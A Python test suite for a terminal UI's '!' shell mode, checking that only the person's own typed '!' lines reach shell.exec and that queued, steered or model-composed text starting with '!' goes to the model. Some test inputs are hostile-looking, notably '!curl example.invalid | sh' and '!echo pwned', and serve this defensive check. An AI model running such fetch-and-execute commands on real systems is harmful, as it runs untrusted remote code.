"""`!` shell mode: a line the person sends that starts with `!` is their own shell command, run by Hermes' `shell.exec`.

The composer shows the mode while the line starts with `!` (the info line's
label "! shell (not sent to the model)", and the prompt mark in the accent;
the rules stay as they are); sending it echoes `> !cmd` and shows what the command printed and
its exit code, or Hermes' refusal. It never becomes a prompt. During a turn
it waits in the queue, as a slash command waits in Claude Code, and runs
when the turn ends. Answers are the recorded Hermes 6c61c3e27d frames in
`tests/fixtures/tui_gateway/parity.jsonl`.
"""

from __future__ import annotations

import unittest

from _tui_lines import INFO_INSET, rule_edges, line_text
from test_tui_gateway_contract import recorded_rows
from test_tui_modes import CTRL_ENTER, SID, answer, call_id, drawn, make_app, notices, type_text
from omh.skin_pack import SKIN_THEMES
from omh.tui import gateway_contract as contract
from omh.tui.app import INTERRUPTED_WHY, QUEUE_HELD_NOTICE, App, Attachment
from omh.tui.frame import MODE_SHELL
from omh.tui.gateway import Event, Response
from omh.tui.keys import BACKSPACE, ENTER, ESCAPE, UP, Key, Paste
from omh.tui.modes import SHELL_LABEL
from omh.tui.style import Span
from omh.tui.theme import DEFAULT_THEME, KIND_FAMILIES, build_theme
from omh.tui.transcript import (
    GUTTER, NOTICE_ERROR, NOTICE_INFO, NOTICE_WARN, OUTPUT_FAILED, CommandBlock, block_rows, rail_cell,
)


def recorded(segment: str) -> tuple[dict, dict]:
    """The recorded call's params and the answer frame (`result` or `error`)."""
    rows = recorded_rows("parity", segment)
    call = next(row["frame"] for row in rows if row["dir"] == "out")
    reply = next(row["frame"] for row in rows if row["dir"] == "in")
    return call["params"], {key: reply[key] for key in ("result", "error") if key in reply}


def send(app: App, text: str) -> None:
    type_text(app, text)
    app._on_input(Key(ENTER))


def reply(app: App, client: object, frame: dict) -> None:
    answer(app, client, frame.get("result"), frame.get("error"))  # type: ignore[arg-type]


class ShellModeTests(unittest.TestCase):
    def test_a_leading_bang_shows_the_shell_mode_on_the_prompt_mark_and_the_info_line(self) -> None:
        from test_tui_app import info_row_of

        from omh.skin_pack import hex_to_rgb

        def mark_colour(screen: list[str]) -> tuple[int, ...]:
            row = next(index for index, line in enumerate(screen) if line.startswith("❯ "))
            attrs = app.terminal.screen.attrs_at(row, 0)  # type: ignore[attr-defined]  # the mark, no side before it
            return tuple(attrs[attrs.index(38) + 2 : attrs.index(38) + 5])

        app, _client = make_app()
        type_text(app, "!ls")
        screen = drawn(app)
        self.assertTrue(info_row_of(screen).startswith(INFO_INSET + SHELL_LABEL), screen)
        self.assertTrue(set(rule_edges(80)) <= set(screen))  # the rules as in every mode
        self.assertEqual(mark_colour(screen), hex_to_rgb(DEFAULT_THEME.kinds[KIND_FAMILIES.index("shell")].fg))  # the shell hue says it, not only the label
        app.composer.replace(0, len(app.composer.text), "ls")
        screen = drawn(app)
        self.assertNotIn(SHELL_LABEL, "\n".join(screen))
        self.assertEqual(mark_colour(screen), hex_to_rgb(DEFAULT_THEME.prompt.fg))

    def test_the_recorded_command_prints_stdout_and_stderr_under_its_echo(self) -> None:
        params, frame = recorded("shell_ok")
        app, client = make_app()
        send(app, "!" + params["command"])
        self.assertEqual(client.calls, [("shell.exec", {"command": params["command"]})])
        block = app.transcript.blocks[-1]
        self.assertIsInstance(block, CommandBlock)
        self.assertEqual(block.command, "!echo hello; echo oops >&2")
        reply(app, client, frame)
        self.assertEqual((block.parts, block.done), ([("hello", NOTICE_INFO), ("oops", NOTICE_INFO)], True))
        self.assertNotIn("prompt.submit", [method for method, _params in client.calls])

    def test_a_non_zero_exit_is_said_after_what_it_printed_and_both_are_on_the_red_band(self) -> None:
        params, frame = recorded("shell_exit")
        app, client = make_app()
        send(app, "!" + params["command"])
        reply(app, client, frame)
        self.assertEqual(app.transcript.blocks[-1].parts, [("partial", OUTPUT_FAILED), ("exit 3", NOTICE_ERROR)])
        theme = build_theme(SKIN_THEMES[0], "#FFFFFF")
        rows = block_rows(app.transcript.blocks[-1], 80, theme)
        self.assertEqual([line_text(row) for row in rows], ["┃ ❯ " + "!" + params["command"], "┃   ⎿  partial", "┃      ✗ exit 3"])
        for row in rows[1:]:  # what it printed and its exit line, one red region beside the echo's rail
            self.assertEqual(row[:2], (rail_cell(theme.dim), Span(" ", GUTTER)))
            self.assertEqual({span.style.bg for span in row[2:]}, {theme.error_band.bg})
        self.assertEqual({span.style.bg for span in rows[0]}, {None})  # the echo is no outcome

    def test_hermes_refusing_a_dangerous_command_is_said_in_its_words(self) -> None:
        params, frame = recorded("shell_blocked")
        app, client = make_app()
        send(app, "!" + params["command"])
        reply(app, client, frame)
        (part,) = app.transcript.blocks[-1].parts
        self.assertEqual(part, ("Blocked: recursive delete. Use the agent for dangerous commands.", NOTICE_WARN))

    def test_a_command_that_prints_nothing_says_its_exit_code(self) -> None:
        app, client = make_app()
        send(app, "!true")
        answer(app, client, {"stdout": "", "stderr": "", "code": 0})
        self.assertEqual(app.transcript.blocks[-1].parts, [("exit 0", NOTICE_INFO)])

    def test_a_bang_alone_says_how_and_sends_nothing(self) -> None:
        app, client = make_app()
        send(app, "!  ")
        self.assertEqual(client.calls, [])
        self.assertIn("!<command>", notices(app, NOTICE_WARN)[-1])

    def test_plan_mode_does_not_wrap_a_shell_line(self) -> None:
        app, client = make_app()
        app.plan_mode = True
        send(app, "!ls")
        self.assertEqual(client.calls, [("shell.exec", {"command": "ls"})])


class ShellDuringATurnTests(unittest.TestCase):
    def test_it_waits_for_the_turn_and_the_prompt_behind_it_waits_for_its_answer(self) -> None:
        app, client = make_app(busy=True)
        send(app, "!ls")
        send(app, "next prompt")
        self.assertEqual(client.calls, [])
        self.assertEqual([(entry.text, entry.shell) for entry in app.queued], [("!ls", True), ("next prompt", False)])
        app._on_event(Event("message.complete", SID, {"text": "done"}))
        self.assertEqual(client.calls, [("shell.exec", {"command": "ls"})])
        app._on_response(Response(1, {"stdout": "a.py\n", "stderr": "", "code": 0}, None))
        self.assertEqual(client.calls[-1], ("prompt.submit", {"session_id": SID, "text": "next prompt", "queued": True}))

    def test_a_prompt_behind_it_waits_for_a_turn_that_started_while_it_ran(self) -> None:
        # A turn another client (or Hermes' own queue) started while the command ran: the prompt goes at that turn's
        # end, not into it, whether Hermes answered the command or refused it.
        for frame in ({"result": {"stdout": "a.py\n", "stderr": "", "code": 0}},
                      {"error": {"code": 4005, "message": "Blocked: recursive delete."}}):
            with self.subTest(answered="result" in frame):
                app, client = make_app(busy=True)
                send(app, "!ls")
                send(app, "next prompt")
                app._on_event(Event("message.complete", SID, {"text": "done"}))
                self.assertEqual(client.calls, [("shell.exec", {"command": "ls"})])
                app._on_event(Event("message.start", SID, {}))
                reply(app, client, frame)
                self.assertEqual(client.calls, [("shell.exec", {"command": "ls"})])
                self.assertEqual([entry.text for entry in app.queued], ["next prompt"])
                app._on_event(Event("message.complete", SID, {"text": "theirs"}))
                self.assertEqual(client.calls[-1],
                                 ("prompt.submit", {"session_id": SID, "text": "next prompt", "queued": True}))

    def test_a_prompt_behind_it_waits_for_the_turn_hermes_runs_next(self) -> None:
        # While the command ran, the person's prompt started a turn, and Hermes queued the line sent into it as its own
        # next prompt: the line after waits for that turn as it does after any turn's end, not only for the command.
        now = [100.0]
        app, client = make_app(busy=True, clock=lambda: now[0])
        for line in ("!ls", "b", "c"):
            send(app, line)
        app._on_event(Event("message.complete", SID, {"text": "done"}))
        send(app, "P")
        app._on_event(Event("message.start", SID, {}))
        app._on_input(CTRL_ENTER)
        answer(app, client, {"status": "queued", "text": "b"})
        app._on_event(Event("message.complete", SID, {"text": "P done"}))
        self.assertIsNotNone(app.hermes_next_due)
        app._on_response(Response(call_id(client, "shell.exec"), {"stdout": "a.py\n", "stderr": "", "code": 0}, None))
        self.assertEqual([params["text"] for method, params in client.calls if method == "prompt.submit"], ["P"])
        self.assertEqual([entry.text for entry in app.queued], ["c"])
        app._on_event(Event("message.start", SID, {}))  # Hermes runs `b`
        app._on_event(Event("message.complete", SID, {"text": "b done"}))
        self.assertEqual(client.calls[-1], ("prompt.submit", {"session_id": SID, "text": "c", "queued": True}))

    def test_esc_on_a_prompt_still_staging_holds_the_line_behind_it(self) -> None:
        # The prompt sent while the command ran waits on its image, so the command's answer sends nothing. Esc gives
        # that prompt back and no turn ends to send the queue on: it is held, as after any interrupt, and says so.
        app, client = make_app(busy=True)
        send(app, "!ls")
        send(app, "next prompt")
        app._on_event(Event("message.complete", SID, {"text": "done"}))
        image = Attachment("/hermes/cache/images/clip_1.png", "clip.png", "", "[Image #1]", b"\x89PNG")
        app._submit("my prompt", images=(image,))
        self.assertTrue(app._busy())
        app._on_response(Response(call_id(client, "shell.exec"), {"stdout": "a.py\n", "stderr": "", "code": 0}, None))
        app._on_input(Key(ESCAPE))
        self.assertEqual((app._busy(), app.queue_held), (False, True))
        self.assertEqual([entry.text for entry in app.queued], ["next prompt"])
        self.assertIn(QUEUE_HELD_NOTICE.format(why=INTERRUPTED_WHY), notices(app))
        self.assertIn("my prompt", app.composer.text)
        self.assertNotIn("prompt.submit", [method for method, _params in client.calls])

    def test_a_bang_line_sent_while_a_queued_one_runs_runs_at_once(self) -> None:
        # No turn runs and the queue waits for no turn Hermes runs next: only the line queued behind the running
        # command waits for its answer, and a new `!` line is not queued behind it.
        app, client = make_app(busy=True)
        send(app, "!ls")
        send(app, "next prompt")
        app._on_event(Event("message.complete", SID, {"text": "done"}))
        send(app, "!pwd")
        self.assertEqual(client.calls, [("shell.exec", {"command": "ls"}), ("shell.exec", {"command": "pwd"})])
        self.assertEqual([entry.text for entry in app.queued], ["next prompt"])

    def test_a_queued_bang_line_with_a_chip_echoes_the_chip_when_it_runs(self) -> None:
        script = "echo one\necho two\necho three\necho four\n"
        app, client = make_app(busy=True)
        type_text(app, "!")
        app._on_input(Paste(script))
        app._on_input(Key(ENTER))
        app._on_event(Event("message.complete", SID, {"text": "done"}))
        self.assertEqual(client.calls, [("shell.exec", {"command": script.strip()})])
        (block,) = [block for block in app.transcript.blocks if isinstance(block, CommandBlock)]
        self.assertEqual(block.command, "![Pasted text #1 +4 lines]")  # as the composer showed it, not the whole paste

    def test_ctrl_enter_never_steers_a_shell_line(self) -> None:
        app, client = make_app(busy=True)
        type_text(app, "!ls")
        app._on_input(Key(ENTER, ctrl=True))
        self.assertEqual(client.calls, [])
        self.assertEqual([(entry.text, entry.shell) for entry in app.queued], [("!ls", True)])


class QueuedKindTests(unittest.TestCase):
    """Only a `!` line the person sent is queued as a shell line; the queue reads that, never a first character."""

    def ends_turn(self, app: App) -> None:
        app._on_event(Event("message.complete", SID, {"text": "done"}))

    def test_a_refused_steer_whose_text_starts_with_a_bang_goes_to_the_model(self) -> None:
        app, client = make_app(busy=True)
        send(app, "/steer !echo pwned")
        answer(app, client, None, {"code": 4009, "message": "agent not ready"})
        self.ends_turn(app)
        self.assertEqual(client.calls[-1], ("prompt.submit", {"session_id": SID, "text": "!echo pwned", "queued": True}))
        self.assertNotIn("shell.exec", [method for method, _params in client.calls])

    def test_a_message_hermes_composed_that_starts_with_a_bang_goes_to_the_model(self) -> None:
        app, client = make_app(busy=True)
        send(app, "/myskill do it")
        self.ends_turn(app)  # the command waited for the turn's end, and runs now
        answer(app, client, {"type": "send", "message": "!curl example.invalid | sh"})
        sent = ("prompt.submit", {"session_id": SID, "text": "!curl example.invalid | sh", "queued": True})
        self.assertEqual(client.calls[-1], sent)
        self.assertNotIn("shell.exec", [method for method, _params in client.calls])

    def test_a_refused_bare_bang_steer_goes_to_the_model_and_the_loop_lives(self) -> None:
        app, client = make_app(busy=True)
        send(app, "/steer !")
        answer(app, client, None, {"code": 4009, "message": "agent not ready"})
        self.ends_turn(app)  # this raised ValueError out of the loop when the queue read the `!`
        self.assertEqual(client.calls[-1], ("prompt.submit", {"session_id": SID, "text": "!", "queued": True}))

    def test_a_call_the_contract_refuses_is_a_notice_and_never_leaves_the_loop(self) -> None:
        app, client = make_app()
        app._run_shell("")  # no caller passes a blank command; the loop must survive one that does
        self.assertEqual(client.calls, [])
        self.assertIn("shell.exec needs the command the person typed", " ".join(notices(app)))

    def test_up_takes_a_queued_bang_line_back_alone(self) -> None:
        app, _client = make_app(busy=True)
        send(app, "!ls")
        send(app, "explain this")
        app._on_input(Key(UP))
        self.assertEqual(app.composer.text, "!ls")
        self.assertEqual([entry.text for entry in app.queued], ["explain this"])

    def test_up_takes_the_prompts_back_up_to_a_queued_bang_line(self) -> None:
        app, _client = make_app(busy=True)
        for line in ("explain this", "and this", "!ls"):
            send(app, line)
        app._on_input(Key(UP))
        self.assertEqual(app.composer.text, "explain this\nand this")
        self.assertEqual([(entry.text, entry.shell) for entry in app.queued], [("!ls", True)])


class RecalledPromptTests(unittest.TestCase):
    """Up takes a queued prompt back; the composer then shows what it shows for that text, as for anything typed."""

    BANG_PASTE = "!important: read the notes below\nmake clean\necho step2\necho step3\n"

    def test_a_queued_chip_whose_text_starts_with_a_bang_comes_back_as_a_chip_and_goes_to_the_model(self) -> None:
        app, client = make_app(busy=True)
        app._on_input(Paste(self.BANG_PASTE))
        app._on_input(Key(ENTER))  # queued as a prompt: the composer showed a chip
        send(app, "and this")
        app._on_input(Key(UP))
        self.assertTrue(app.composer.text.startswith("[Pasted text #"), app.composer.text)
        self.assertTrue(app.composer.text.endswith("\nand this"), app.composer.text)
        self.assertEqual(app._display_mode(), "normal")  # no `!` line on the composer
        app._on_input(Key(ENTER))
        self.assertEqual([(entry.text, entry.shell) for entry in app.queued], [(self.BANG_PASTE + "\nand this", False)])
        app._on_event(Event("message.complete", SID, {"text": "done"}))
        self.assertEqual(client.calls, [("prompt.submit", {"session_id": SID, "text": self.BANG_PASTE + "\nand this",
                                                           "queued": True})])

    def test_words_typed_after_a_bang_chip_come_back_as_words_beside_the_chip(self) -> None:
        # The chip comes back holding the paste alone; the words after it are text again, to edit.
        app, client = make_app(busy=True)
        app._on_input(Paste(self.BANG_PASTE))
        type_text(app, " and also this")
        shown = app.composer.text
        app._on_input(Key(ENTER))
        app._on_input(Key(UP))
        self.assertEqual(app.composer.text, shown)
        self.assertEqual(list(app.composer.pastes.values()), [self.BANG_PASTE])
        self.assertEqual(app._display_mode(), "normal")
        for _ in " this":
            app._on_input(Key(BACKSPACE))  # the words are text: Backspace takes characters, never the chip
        self.assertEqual(app.composer.text, shown[: -len(" this")])
        self.assertEqual(len(app.composer.pastes), 1)
        app._on_input(Key(ENTER))
        app._on_event(Event("message.complete", SID, {"text": "done"}))
        sent = self.BANG_PASTE + " and also"
        self.assertEqual(client.calls, [("prompt.submit", {"session_id": SID, "text": sent, "queued": True})])

    def test_a_refused_steer_whose_text_starts_with_a_bang_comes_back_as_its_text(self) -> None:
        # Documented in `_recall_queue`: the composer decides again, so this text shows as a `!` line.
        app, client = make_app(busy=True)
        send(app, "/steer !echo pwned")
        answer(app, client, None, {"code": 4009, "message": "agent not ready"})
        app._on_input(Key(UP))
        self.assertEqual(app.composer.text, "!echo pwned")
        self.assertEqual(app._display_mode(), MODE_SHELL)


class ShownLineDecidesTests(unittest.TestCase):
    """What a line is (`!` shell, slash command, prompt) is read from what the composer showed, never a chip's text."""

    BANG_PASTE = "!important: read the notes below\nmake clean\necho step2\necho step3\n"
    QUIT_PASTE = "/quit is what the old docs said\nline 2\nline 3\nline 4\n"
    SCRIPT = "echo one\necho two\necho three\necho four\n"
    CHIP = "[Pasted text #1 +4 lines]"

    def test_a_chip_whose_text_starts_with_a_bang_goes_to_the_model(self) -> None:
        app, client = make_app()
        app._on_input(Paste(self.BANG_PASTE))
        self.assertEqual(app._display_mode(), "normal")  # what the person saw: a prompt
        app._on_input(Key(ENTER))
        self.assertEqual(client.calls, [("prompt.submit", {"session_id": SID, "text": self.BANG_PASTE})])

    def test_a_chip_whose_text_starts_with_quit_goes_to_the_model_and_the_session_stays(self) -> None:
        app, client = make_app()
        app._on_input(Paste(self.QUIT_PASTE))
        app._on_input(Key(ENTER))
        self.assertEqual(client.calls, [("prompt.submit", {"session_id": SID, "text": self.QUIT_PASTE})])
        self.assertIsNone(app.exit_code)

    def test_a_slash_glued_to_a_chip_never_runs_the_chips_first_word(self) -> None:
        app, client = make_app()
        type_text(app, "/")
        app._on_input(Paste("quit now\nline 2\nline 3\nline 4\n"))
        app._on_input(Key(ENTER))
        self.assertNotIn("session.close", [method for method, _params in client.calls])
        self.assertIsNone(app.exit_code)

    def test_ctrl_enter_steers_a_chip_whose_text_starts_with_a_bang(self) -> None:
        app, client = make_app(busy=True)
        app._on_input(Paste(self.BANG_PASTE))
        app._on_input(Key(ENTER, ctrl=True))
        self.assertEqual(client.calls, [("session.redirect", {"session_id": SID, "text": self.BANG_PASTE})])
        self.assertFalse(app.queued)

    def test_a_typed_bang_runs_the_chip_after_it_and_the_echo_shows_the_chip(self) -> None:
        # The `!` is the person's, on screen in the shell mode, so the paste after it is their command.
        app, client = make_app()
        type_text(app, "!")
        app._on_input(Paste(self.SCRIPT))
        self.assertEqual(app._display_mode(), MODE_SHELL)
        app._on_input(Key(ENTER))
        self.assertEqual(client.calls, [("shell.exec", {"command": self.SCRIPT.strip()})])
        (block,) = [block for block in app.transcript.blocks if isinstance(block, CommandBlock)]
        self.assertEqual(block.command, "!" + self.CHIP)

    def test_a_chip_in_a_commands_argument_is_sent_whole_and_echoed_as_the_chip(self) -> None:
        app, client = make_app()
        type_text(app, "/learn ")
        app._on_input(Paste(self.SCRIPT))
        app._on_input(Key(ENTER))
        self.assertEqual(client.calls, [("slash.exec", {"command": "learn " + self.SCRIPT.strip(), "session_id": SID})])
        (block,) = [block for block in app.transcript.blocks if isinstance(block, CommandBlock)]
        self.assertEqual(block.command, "/learn " + self.CHIP)


class ContractTests(unittest.TestCase):
    def test_shell_exec_carries_the_command_only(self) -> None:
        # ShellExecParams in Hermes 6c61c3e27d's contracts/tools_commands.py: command, profile.
        self.assertEqual(contract.CLIENT_METHODS["shell.exec"], {"command"})
        self.assertIn("command", contract.call_problem("shell.exec", {"command": ""}))
        self.assertEqual(contract.call_problem("shell.exec", recorded("shell_ok")[0]), "")


if __name__ == "__main__":
    unittest.main()
